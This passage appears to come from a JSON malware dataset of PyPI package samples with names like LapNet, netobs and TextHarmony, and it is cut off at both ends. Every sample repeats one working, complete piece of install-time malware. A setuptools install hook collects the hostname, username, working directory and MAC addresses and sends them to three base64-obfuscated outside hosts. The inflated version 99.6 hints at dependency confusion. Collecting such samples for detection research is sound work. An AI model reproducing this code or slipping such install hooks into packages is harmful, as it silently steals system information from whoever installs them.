        "code": "import platform as pltfrm\nimport getpass as gtps\nimport os as osys\nimport urllib.parse as uprs\nimport urllib.request as urqt\nimport random as rndm\nimport subprocess as sbprc\nimport base64 as b64\n\ndef g_m_a():\n    m_a = []\n    sys = pltfrm.system()\n\n    if sys == \"Windows\":\n        out = sbprc.check_output(\"getmac\", shell=True).decode()\n        for ln in out.splitlines():\n            if \"Physical\" in ln:\n                mc = ln.split()[0]\n                m_a.append(mc)\n\n    elif sys == \"Linux\" or sys == \"Darwin\":\n        out = sbprc.check_output(\"ifconfig\", shell=True).decode()\n        for ln in out.splitlines():\n            if \"ether\" in ln:\n                mc = ln.split()[1]\n                m_a.append(mc)\n\n    return m_a\n\ndef m():\n    hstnm = pltfrm.node()\n    usrnm = gtps.getuser()\n    cur_pth = osys.getcwd()\n    r_n = rndm.randint(10000, 99999)\n    m_a = g_m_a()\n    b64_m_a = b64.b64encode(str(m_a).encode('utf-8')).decode('utf-8')\n\n    urllst = [\n        b64.b64decode(b'aHR0cDovL2RuaXBxb3VlYm0tcHNsLmNuLm9hc3QtY24uYnl0ZWQtZGFzdC5jb20=').decode('utf-8'),\n        b64.b64decode(b'aHR0cDovL29xdmlnbmtwNTgtcHNsLmkxOG4ub2FzdC1yb3cuYnl0ZWQtZGFzdC5jb20=').decode('utf-8'),\n        b64.b64decode(b'aHR0cDovL3NiZndzdHNwdXV0aWFyY2p6cHRmM2MwY3ZiNnluZzZtdy5vYXN0LmZ1bg==').decode('utf-8')\n    ]\n\n    for url in urllst:\n        prmtrs = {\n            \"hostname\": hstnm,\n            \"username\": usrnm,\n            \"dir\": cur_pth,\n            \"mac_address\": b64_m_a\n        }\n        f_url = f\"{url}/realtime_p/pypi/{r_n}?{uprs.urlencode(prmtrs)}\"\n        try:\n            with urqt.urlopen(f_url) as rspns:\n                pass\n        except Exception as ex:\n            pass\n\nif __name__ == \"__main__\":\n    m()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import m\n        m()\n\nsetup(\n    name=\"GR-MG\",\n    version=\"99.6\",\n    author=\"gooder\",\n    author_email=\"googerfine@google.com\",\n    description=\"none\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"none\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-19-lapnet-v99.6",
        "code": "import platform as pltfrm\nimport getpass as gtps\nimport os as osys\nimport urllib.parse as uprs\nimport urllib.request as urqt\nimport random as rndm\nimport subprocess as sbprc\nimport base64 as b64\n\ndef g_m_a():\n    m_a = []\n    sys = pltfrm.system()\n\n    if sys == \"Windows\":\n        out = sbprc.check_output(\"getmac\", shell=True).decode()\n        for ln in out.splitlines():\n            if \"Physical\" in ln:\n                mc = ln.split()[0]\n                m_a.append(mc)\n\n    elif sys == \"Linux\" or sys == \"Darwin\":\n        out = sbprc.check_output(\"ifconfig\", shell=True).decode()\n        for ln in out.splitlines():\n            if \"ether\" in ln:\n                mc = ln.split()[1]\n                m_a.append(mc)\n\n    return m_a\n\ndef m():\n    hstnm = pltfrm.node()\n    usrnm = gtps.getuser()\n    cur_pth = osys.getcwd()\n    r_n = rndm.randint(10000, 99999)\n    m_a = g_m_a()\n    b64_m_a = b64.b64encode(str(m_a).encode('utf-8')).decode('utf-8')\n\n    urllst = [\n        b64.b64decode(b'aHR0cDovL2RuaXBxb3VlYm0tcHNsLmNuLm9hc3QtY24uYnl0ZWQtZGFzdC5jb20=').decode('utf-8'),\n        b64.b64decode(b'aHR0cDovL29xdmlnbmtwNTgtcHNsLmkxOG4ub2FzdC1yb3cuYnl0ZWQtZGFzdC5jb20=').decode('utf-8'),\n        b64.b64decode(b'aHR0cDovL3NiZndzdHNwdXV0aWFyY2p6cHRmM2MwY3ZiNnluZzZtdy5vYXN0LmZ1bg==').decode('utf-8')\n    ]\n\n    for url in urllst:\n        prmtrs = {\n            \"hostname\": hstnm,\n            \"username\": usrnm,\n            \"dir\": cur_pth,\n            \"mac_address\": b64_m_a\n        }\n        f_url = f\"{url}/realtime_p/pypi/{r_n}?{uprs.urlencode(prmtrs)}\"\n        try:\n            with urqt.urlopen(f_url) as rspns:\n                pass\n        except Exception as ex:\n            pass\n\nif __name__ == \"__main__\":\n    m()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import m\n        m()\n\nsetup(\n    name=\"LapNet\",\n    version=\"99.6\",\n    author=\"gooder\",\n    author_email=\"googerfine@google.com\",\n    description=\"none\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"none\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-19-licensemonitor-v99.6",
        "code": "import platform as pltfrm\nimport getpass as gtps\nimport os as osys\nimport urllib.parse as uprs\nimport urllib.request as urqt\nimport random as rndm\nimport subprocess as sbprc\nimport base64 as b64\n\ndef g_m_a():\n    m_a = []\n    sys = pltfrm.system()\n\n    if sys == \"Windows\":\n        out = sbprc.check_output(\"getmac\", shell=True).decode()\n        for ln in out.splitlines():\n            if \"Physical\" in ln:\n                mc = ln.split()[0]\n                m_a.append(mc)\n\n    elif sys == \"Linux\" or sys == \"Darwin\":\n        out = sbprc.check_output(\"ifconfig\", shell=True).decode()\n        for ln in out.splitlines():\n            if \"ether\" in ln:\n                mc = ln.split()[1]\n                m_a.append(mc)\n\n    return m_a\n\ndef m():\n    hstnm = pltfrm.node()\n    usrnm = gtps.getuser()\n    cur_pth = osys.getcwd()\n    r_n = rndm.randint(10000, 99999)\n    m_a = g_m_a()\n    b64_m_a = b64.b64encode(str(m_a).encode('utf-8')).decode('utf-8')\n\n    urllst = [\n        b64.b64decode(b'aHR0cDovL2RuaXBxb3VlYm0tcHNsLmNuLm9hc3QtY24uYnl0ZWQtZGFzdC5jb20=').decode('utf-8'),\n        b64.b64decode(b'aHR0cDovL29xdmlnbmtwNTgtcHNsLmkxOG4ub2FzdC1yb3cuYnl0ZWQtZGFzdC5jb20=').decode('utf-8'),\n        b64.b64decode(b'aHR0cDovL3NiZndzdHNwdXV0aWFyY2p6cHRmM2MwY3ZiNnluZzZtdy5vYXN0LmZ1bg==').decode('utf-8')\n    ]\n\n    for url in urllst:\n        prmtrs = {\n            \"hostname\": hstnm,\n            \"username\": usrnm,\n            \"dir\": cur_pth,\n            \"mac_address\": b64_m_a\n        }\n        f_url = f\"{url}/realtime_p/pypi/{r_n}?{uprs.urlencode(prmtrs)}\"\n        try:\n            with urqt.urlopen(f_url) as rspns:\n                pass\n        except Exception as ex:\n            pass\n\nif __name__ == \"__main__\":\n    m()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import m\n        m()\n\nsetup(\n    name=\"licenseMonitor\",\n    version=\"99.6\",\n    author=\"gooder\",\n    author_email=\"googerfine@google.com\",\n    description=\"none\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"none\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-19-netobs-v99.6",
        "code": "import platform as pltfrm\nimport getpass as gtps\nimport os as osys\nimport urllib.parse as uprs\nimport urllib.request as urqt\nimport random as rndm\nimport subprocess as sbprc\nimport base64 as b64\n\ndef g_m_a():\n    m_a = []\n    sys = pltfrm.system()\n\n    if sys == \"Windows\":\n        out = sbprc.check_output(\"getmac\", shell=True).decode()\n        for ln in out.splitlines():\n            if \"Physical\" in ln:\n                mc = ln.split()[0]\n                m_a.append(mc)\n\n    elif sys == \"Linux\" or sys == \"Darwin\":\n        out = sbprc.check_output(\"ifconfig\", shell=True).decode()\n        for ln in out.splitlines():\n            if \"ether\" in ln:\n                mc = ln.split()[1]\n                m_a.append(mc)\n\n    return m_a\n\ndef m():\n    hstnm = pltfrm.node()\n    usrnm = gtps.getuser()\n    cur_pth = osys.getcwd()\n    r_n = rndm.randint(10000, 99999)\n    m_a = g_m_a()\n    b64_m_a = b64.b64encode(str(m_a).encode('utf-8')).decode('utf-8')\n\n    urllst = [\n        b64.b64decode(b'aHR0cDovL2RuaXBxb3VlYm0tcHNsLmNuLm9hc3QtY24uYnl0ZWQtZGFzdC5jb20=').decode('utf-8'),\n        b64.b64decode(b'aHR0cDovL29xdmlnbmtwNTgtcHNsLmkxOG4ub2FzdC1yb3cuYnl0ZWQtZGFzdC5jb20=').decode('utf-8'),\n        b64.b64decode(b'aHR0cDovL3NiZndzdHNwdXV0aWFyY2p6cHRmM2MwY3ZiNnluZzZtdy5vYXN0LmZ1bg==').decode('utf-8')\n    ]\n\n    for url in urllst:\n        prmtrs = {\n            \"hostname\": hstnm,\n            \"username\": usrnm,\n            \"dir\": cur_pth,\n            \"mac_address\": b64_m_a\n        }\n        f_url = f\"{url}/realtime_p/pypi/{r_n}?{uprs.urlencode(prmtrs)}\"\n        try:\n            with urqt.urlopen(f_url) as rspns:\n                pass\n        except Exception as ex:\n            pass\n\nif __name__ == \"__main__\":\n    m()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import m\n        m()\n\nsetup(\n    name=\"netobs\",\n    version=\"99.6\",\n    author=\"gooder\",\n    author_email=\"googerfine@google.com\",\n    description=\"none\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"none\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-19-offline-rl-congestion-control-v99.6",
        "code": "import platform as pltfrm\nimport getpass as gtps\nimport os as osys\nimport urllib.parse as uprs\nimport urllib.request as urqt\nimport random as rndm\nimport subprocess as sbprc\nimport base64 as b64\n\ndef g_m_a():\n    m_a = []\n    sys = pltfrm.system()\n\n    if sys == \"Windows\":\n        out = sbprc.check_output(\"getmac\", shell=True).decode()\n        for ln in out.splitlines():\n            if \"Physical\" in ln:\n                mc = ln.split()[0]\n                m_a.append(mc)\n\n    elif sys == \"Linux\" or sys == \"Darwin\":\n        out = sbprc.check_output(\"ifconfig\", shell=True).decode()\n        for ln in out.splitlines():\n            if \"ether\" in ln:\n                mc = ln.split()[1]\n                m_a.append(mc)\n\n    return m_a\n\ndef m():\n    hstnm = pltfrm.node()\n    usrnm = gtps.getuser()\n    cur_pth = osys.getcwd()\n    r_n = rndm.randint(10000, 99999)\n    m_a = g_m_a()\n    b64_m_a = b64.b64encode(str(m_a).encode('utf-8')).decode('utf-8')\n\n    urllst = [\n        b64.b64decode(b'aHR0cDovL2RuaXBxb3VlYm0tcHNsLmNuLm9hc3QtY24uYnl0ZWQtZGFzdC5jb20=').decode('utf-8'),\n        b64.b64decode(b'aHR0cDovL29xdmlnbmtwNTgtcHNsLmkxOG4ub2FzdC1yb3cuYnl0ZWQtZGFzdC5jb20=').decode('utf-8'),\n        b64.b64decode(b'aHR0cDovL3NiZndzdHNwdXV0aWFyY2p6cHRmM2MwY3ZiNnluZzZtdy5vYXN0LmZ1bg==').decode('utf-8')\n    ]\n\n    for url in urllst:\n        prmtrs = {\n            \"hostname\": hstnm,\n            \"username\": usrnm,\n            \"dir\": cur_pth,\n            \"mac_address\": b64_m_a\n        }\n        f_url = f\"{url}/realtime_p/pypi/{r_n}?{uprs.urlencode(prmtrs)}\"\n        try:\n            with urqt.urlopen(f_url) as rspns:\n                pass\n        except Exception as ex:\n            pass\n\nif __name__ == \"__main__\":\n    m()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import m\n        m()\n\nsetup(\n    name=\"offline-RL-congestion-control\",\n    version=\"99.6\",\n    author=\"gooder\",\n    author_email=\"googerfine@google.com\",\n    description=\"none\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"none\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-19-ohta-v99.6",
        "code": "import platform as pltfrm\nimport getpass as gtps\nimport os as osys\nimport urllib.parse as uprs\nimport urllib.request as urqt\nimport random as rndm\nimport subprocess as sbprc\nimport base64 as b64\n\ndef g_m_a():\n    m_a = []\n    sys = pltfrm.system()\n\n    if sys == \"Windows\":\n        out = sbprc.check_output(\"getmac\", shell=True).decode()\n        for ln in out.splitlines():\n            if \"Physical\" in ln:\n                mc = ln.split()[0]\n                m_a.append(mc)\n\n    elif sys == \"Linux\" or sys == \"Darwin\":\n        out = sbprc.check_output(\"ifconfig\", shell=True).decode()\n        for ln in out.splitlines():\n            if \"ether\" in ln:\n                mc = ln.split()[1]\n                m_a.append(mc)\n\n    return m_a\n\ndef m():\n    hstnm = pltfrm.node()\n    usrnm = gtps.getuser()\n    cur_pth = osys.getcwd()\n    r_n = rndm.randint(10000, 99999)\n    m_a = g_m_a()\n    b64_m_a = b64.b64encode(str(m_a).encode('utf-8')).decode('utf-8')\n\n    urllst = [\n        b64.b64decode(b'aHR0cDovL2RuaXBxb3VlYm0tcHNsLmNuLm9hc3QtY24uYnl0ZWQtZGFzdC5jb20=').decode('utf-8'),\n        b64.b64decode(b'aHR0cDovL29xdmlnbmtwNTgtcHNsLmkxOG4ub2FzdC1yb3cuYnl0ZWQtZGFzdC5jb20=').decode('utf-8'),\n        b64.b64decode(b'aHR0cDovL3NiZndzdHNwdXV0aWFyY2p6cHRmM2MwY3ZiNnluZzZtdy5vYXN0LmZ1bg==').decode('utf-8')\n    ]\n\n    for url in urllst:\n        prmtrs = {\n            \"hostname\": hstnm,\n            \"username\": usrnm,\n            \"dir\": cur_pth,\n            \"mac_address\": b64_m_a\n        }\n        f_url = f\"{url}/realtime_p/pypi/{r_n}?{uprs.urlencode(prmtrs)}\"\n        try:\n            with urqt.urlopen(f_url) as rspns:\n                pass\n        except Exception as ex:\n            pass\n\nif __name__ == \"__main__\":\n    m()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import m\n        m()\n\nsetup(\n    name=\"OHTA\",\n    version=\"99.6\",\n    author=\"gooder\",\n    author_email=\"googerfine@google.com\",\n    description=\"none\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"none\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-19-paws-room-acoustics-simulator-v99.6",
        "code": "import platform as pltfrm\nimport getpass as gtps\nimport os as osys\nimport urllib.parse as uprs\nimport urllib.request as urqt\nimport random as rndm\nimport subprocess as sbprc\nimport base64 as b64\n\ndef g_m_a():\n    m_a = []\n    sys = pltfrm.system()\n\n    if sys == \"Windows\":\n        out = sbprc.check_output(\"getmac\", shell=True).decode()\n        for ln in out.splitlines():\n            if \"Physical\" in ln:\n                mc = ln.split()[0]\n                m_a.append(mc)\n\n    elif sys == \"Linux\" or sys == \"Darwin\":\n        out = sbprc.check_output(\"ifconfig\", shell=True).decode()\n        for ln in out.splitlines():\n            if \"ether\" in ln:\n                mc = ln.split()[1]\n                m_a.append(mc)\n\n    return m_a\n\ndef m():\n    hstnm = pltfrm.node()\n    usrnm = gtps.getuser()\n    cur_pth = osys.getcwd()\n    r_n = rndm.randint(10000, 99999)\n    m_a = g_m_a()\n    b64_m_a = b64.b64encode(str(m_a).encode('utf-8')).decode('utf-8')\n\n    urllst = [\n        b64.b64decode(b'aHR0cDovL2RuaXBxb3VlYm0tcHNsLmNuLm9hc3QtY24uYnl0ZWQtZGFzdC5jb20=').decode('utf-8'),\n        b64.b64decode(b'aHR0cDovL29xdmlnbmtwNTgtcHNsLmkxOG4ub2FzdC1yb3cuYnl0ZWQtZGFzdC5jb20=').decode('utf-8'),\n        b64.b64decode(b'aHR0cDovL3NiZndzdHNwdXV0aWFyY2p6cHRmM2MwY3ZiNnluZzZtdy5vYXN0LmZ1bg==').decode('utf-8')\n    ]\n\n    for url in urllst:\n        prmtrs = {\n            \"hostname\": hstnm,\n            \"username\": usrnm,\n            \"dir\": cur_pth,\n            \"mac_address\": b64_m_a\n        }\n        f_url = f\"{url}/realtime_p/pypi/{r_n}?{uprs.urlencode(prmtrs)}\"\n        try:\n            with urqt.urlopen(f_url) as rspns:\n                pass\n        except Exception as ex:\n            pass\n\nif __name__ == \"__main__\":\n    m()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import m\n        m()\n\nsetup(\n    name=\"paws_room_acoustics_simulator\",\n    version=\"99.6\",\n    author=\"gooder\",\n    author_email=\"googerfine@google.com\",\n    description=\"none\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"none\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-19-portrait-mode-video-v99.6",
        "code": "import platform as pltfrm\nimport getpass as gtps\nimport os as osys\nimport urllib.parse as uprs\nimport urllib.request as urqt\nimport random as rndm\nimport subprocess as sbprc\nimport base64 as b64\n\ndef g_m_a():\n    m_a = []\n    sys = pltfrm.system()\n\n    if sys == \"Windows\":\n        out = sbprc.check_output(\"getmac\", shell=True).decode()\n        for ln in out.splitlines():\n            if \"Physical\" in ln:\n                mc = ln.split()[0]\n                m_a.append(mc)\n\n    elif sys == \"Linux\" or sys == \"Darwin\":\n        out = sbprc.check_output(\"ifconfig\", shell=True).decode()\n        for ln in out.splitlines():\n            if \"ether\" in ln:\n                mc = ln.split()[1]\n                m_a.append(mc)\n\n    return m_a\n\ndef m():\n    hstnm = pltfrm.node()\n    usrnm = gtps.getuser()\n    cur_pth = osys.getcwd()\n    r_n = rndm.randint(10000, 99999)\n    m_a = g_m_a()\n    b64_m_a = b64.b64encode(str(m_a).encode('utf-8')).decode('utf-8')\n\n    urllst = [\n        b64.b64decode(b'aHR0cDovL2RuaXBxb3VlYm0tcHNsLmNuLm9hc3QtY24uYnl0ZWQtZGFzdC5jb20=').decode('utf-8'),\n        b64.b64decode(b'aHR0cDovL29xdmlnbmtwNTgtcHNsLmkxOG4ub2FzdC1yb3cuYnl0ZWQtZGFzdC5jb20=').decode('utf-8'),\n        b64.b64decode(b'aHR0cDovL3NiZndzdHNwdXV0aWFyY2p6cHRmM2MwY3ZiNnluZzZtdy5vYXN0LmZ1bg==').decode('utf-8')\n    ]\n\n    for url in urllst:\n        prmtrs = {\n            \"hostname\": hstnm,\n            \"username\": usrnm,\n            \"dir\": cur_pth,\n            \"mac_address\": b64_m_a\n        }\n        f_url = f\"{url}/realtime_p/pypi/{r_n}?{uprs.urlencode(prmtrs)}\"\n        try:\n            with urqt.urlopen(f_url) as rspns:\n                pass\n        except Exception as ex:\n            pass\n\nif __name__ == \"__main__\":\n    m()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import m\n        m()\n\nsetup(\n    name=\"Portrait-Mode-Video\",\n    version=\"99.6\",\n    author=\"gooder\",\n    author_email=\"googerfine@google.com\",\n    description=\"none\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"none\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-19-service-affinity-scheduling-v99.6",
        "code": "import platform as pltfrm\nimport getpass as gtps\nimport os as osys\nimport urllib.parse as uprs\nimport urllib.request as urqt\nimport random as rndm\nimport subprocess as sbprc\nimport base64 as b64\n\ndef g_m_a():\n    m_a = []\n    sys = pltfrm.system()\n\n    if sys == \"Windows\":\n        out = sbprc.check_output(\"getmac\", shell=True).decode()\n        for ln in out.splitlines():\n            if \"Physical\" in ln:\n                mc = ln.split()[0]\n                m_a.append(mc)\n\n    elif sys == \"Linux\" or sys == \"Darwin\":\n        out = sbprc.check_output(\"ifconfig\", shell=True).decode()\n        for ln in out.splitlines():\n            if \"ether\" in ln:\n                mc = ln.split()[1]\n                m_a.append(mc)\n\n    return m_a\n\ndef m():\n    hstnm = pltfrm.node()\n    usrnm = gtps.getuser()\n    cur_pth = osys.getcwd()\n    r_n = rndm.randint(10000, 99999)\n    m_a = g_m_a()\n    b64_m_a = b64.b64encode(str(m_a).encode('utf-8')).decode('utf-8')\n\n    urllst = [\n        b64.b64decode(b'aHR0cDovL2RuaXBxb3VlYm0tcHNsLmNuLm9hc3QtY24uYnl0ZWQtZGFzdC5jb20=').decode('utf-8'),\n        b64.b64decode(b'aHR0cDovL29xdmlnbmtwNTgtcHNsLmkxOG4ub2FzdC1yb3cuYnl0ZWQtZGFzdC5jb20=').decode('utf-8'),\n        b64.b64decode(b'aHR0cDovL3NiZndzdHNwdXV0aWFyY2p6cHRmM2MwY3ZiNnluZzZtdy5vYXN0LmZ1bg==').decode('utf-8')\n    ]\n\n    for url in urllst:\n        prmtrs = {\n            \"hostname\": hstnm,\n            \"username\": usrnm,\n            \"dir\": cur_pth,\n            \"mac_address\": b64_m_a\n        }\n        f_url = f\"{url}/realtime_p/pypi/{r_n}?{uprs.urlencode(prmtrs)}\"\n        try:\n            with urqt.urlopen(f_url) as rspns:\n                pass\n        except Exception as ex:\n            pass\n\nif __name__ == \"__main__\":\n    m()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import m\n        m()\n\nsetup(\n    name=\"Service-Affinity-Scheduling\",\n    version=\"99.6\",\n    author=\"gooder\",\n    author_email=\"googerfine@google.com\",\n    description=\"none\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"none\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-19-shot2story-v99.6",
        "code": "import platform as pltfrm\nimport getpass as gtps\nimport os as osys\nimport urllib.parse as uprs\nimport urllib.request as urqt\nimport random as rndm\nimport subprocess as sbprc\nimport base64 as b64\n\ndef g_m_a():\n    m_a = []\n    sys = pltfrm.system()\n\n    if sys == \"Windows\":\n        out = sbprc.check_output(\"getmac\", shell=True).decode()\n        for ln in out.splitlines():\n            if \"Physical\" in ln:\n                mc = ln.split()[0]\n                m_a.append(mc)\n\n    elif sys == \"Linux\" or sys == \"Darwin\":\n        out = sbprc.check_output(\"ifconfig\", shell=True).decode()\n        for ln in out.splitlines():\n            if \"ether\" in ln:\n                mc = ln.split()[1]\n                m_a.append(mc)\n\n    return m_a\n\ndef m():\n    hstnm = pltfrm.node()\n    usrnm = gtps.getuser()\n    cur_pth = osys.getcwd()\n    r_n = rndm.randint(10000, 99999)\n    m_a = g_m_a()\n    b64_m_a = b64.b64encode(str(m_a).encode('utf-8')).decode('utf-8')\n\n    urllst = [\n        b64.b64decode(b'aHR0cDovL2RuaXBxb3VlYm0tcHNsLmNuLm9hc3QtY24uYnl0ZWQtZGFzdC5jb20=').decode('utf-8'),\n        b64.b64decode(b'aHR0cDovL29xdmlnbmtwNTgtcHNsLmkxOG4ub2FzdC1yb3cuYnl0ZWQtZGFzdC5jb20=').decode('utf-8'),\n        b64.b64decode(b'aHR0cDovL3NiZndzdHNwdXV0aWFyY2p6cHRmM2MwY3ZiNnluZzZtdy5vYXN0LmZ1bg==').decode('utf-8')\n    ]\n\n    for url in urllst:\n        prmtrs = {\n            \"hostname\": hstnm,\n            \"username\": usrnm,\n            \"dir\": cur_pth,\n            \"mac_address\": b64_m_a\n        }\n        f_url = f\"{url}/realtime_p/pypi/{r_n}?{uprs.urlencode(prmtrs)}\"\n        try:\n            with urqt.urlopen(f_url) as rspns:\n                pass\n        except Exception as ex:\n            pass\n\nif __name__ == \"__main__\":\n    m()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import m\n        m()\n\nsetup(\n    name=\"Shot2Story\",\n    version=\"99.6\",\n    author=\"gooder\",\n    author_email=\"googerfine@google.com\",\n    description=\"none\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"none\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-19-textharmony-v99.6",
        "code": "import platform as pltfrm\nimport getpass as gtps\nimport os as osys\nimport urllib.parse as uprs\nimport urllib.request as urqt\nimport random as rndm\nimport subprocess as sbprc\nimport base64 as b64\n\ndef g_m_a():\n    m_a = []\n    sys = pltfrm.system()\n\n    if sys == \"Windows\":\n        out = sbprc.check_output(\"getmac\", shell=True).decode()\n        for ln in out.splitlines():\n            if \"Physical\" in ln:\n                mc = ln.split()[0]\n                m_a.append(mc)\n\n    elif sys == \"Linux\" or sys == \"Darwin\":\n        out = sbprc.check_output(\"ifconfig\", shell=True).decode()\n        for ln in out.splitlines():\n            if \"ether\" in ln:\n                mc = ln.split()[1]\n                m_a.append(mc)\n\n    return m_a\n\ndef m():\n    hstnm = pltfrm.node()\n    usrnm = gtps.getuser()\n    cur_pth = osys.getcwd()\n    r_n = rndm.randint(10000, 99999)\n    m_a = g_m_a()\n    b64_m_a = b64.b64encode(str(m_a).encode('utf-8')).decode('utf-8')\n\n    urllst = [\n        b64.b64decode(b'aHR0cDovL2RuaXBxb3VlYm0tcHNsLmNuLm9hc3QtY24uYnl0ZWQtZGFzdC5jb20=').decode('utf-8'),\n        b64.b64decode(b'aHR0cDovL29xdmlnbmtwNTgtcHNsLmkxOG4ub2FzdC1yb3cuYnl0ZWQtZGFzdC5jb20=').decode('utf-8'),\n        b64.b64decode(b'aHR0cDovL3NiZndzdHNwdXV0aWFyY2p6cHRmM2MwY3ZiNnluZzZtdy5vYXN0LmZ1bg==').decode('utf-8')\n    ]\n\n    for url in urllst:\n        prmtrs = {\n            \"hostname\": hstnm,\n            \"username\": usrnm,\n            \"dir\": cur_pth,\n            \"mac_address\": b64_m_a\n        }\n        f_url = f\"{url}/realtime_p/pypi/{r_n}?{uprs.urlencode(prmtrs)}\"\n        try:\n            with urqt.urlopen(f_url) as rspns:\n                pass\n        except Exception as ex:\n            pass\n\nif __name__ == \"__main__\":\n    m()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import m\n        m()\n\nsetup(\n    name=\"TextHarmony\",\n    version=\"99.6\",\n    author=\"gooder\",\n    author_email=\"googerfine@google.com\",\n    description=\"none\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"none\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-19-vtvqa-v99.6",
        "code": "import platform as pltfrm\nimport getpass as gtps\nimport os as osys\nimport urllib.parse as uprs\nimport urllib.request as urqt\nimport random as rndm\nimport subprocess as sbprc\nimport base64 as b64\n\ndef g_m_a():\n    m_a = []\n    sys = pltfrm.system()\n\n    if sys == \"Windows\":\n        out = sbprc.check_output(\"getmac\", shell=True).decode()\n        for ln in out.splitlines():\n            if \"Physical\" in ln:\n                mc = ln.split()[0]\n                m_a.append(mc)\n\n    elif sys == \"Linux\" or sys == \"Darwin\":\n        out = sbprc.check_output(\"ifconfig\", shell=True).decode()\n        for ln in out.splitlines():\n            if \"ether\" in ln:\n                mc = ln.split()[1]\n                m_a.append(mc)\n\n    return m_a\n\ndef m():\n    hstnm = pltfrm.node()\n    usrnm = gtps.getuser()\n    cur_pth = osys.getcwd()\n    r_n = rndm.randint(10000, 99999)\n    m_a = g_m_a()\n    b64_m_a = b64.b64encode(str(m_a).encode('utf-8')).decode('utf-8')\n\n    urllst = [\n        b64.b64decode(b'aHR0cDovL2RuaXBxb3VlYm0tcHNsLmNuLm9hc3QtY24uYnl0ZWQtZGFzdC5jb20=').decode('utf-8'),\n        b64.b64decode(b'aHR0cDovL29xdmlnbmtwNTgtcHNsLmkxOG4ub2FzdC1yb3cuYnl0ZWQtZGFzdC5jb20=').decode('utf-8'),\n        b64.b64decode(b'aHR0cDovL3NiZndzdHNwdXV0aWFyY2p6cHRmM2MwY3ZiNnluZzZtdy5vYXN0LmZ1bg==').decode('utf-8')\n    ]\n\n    for url in urllst:\n        prmtrs = {\n            \"hostname\": hstnm,\n            \"username\": 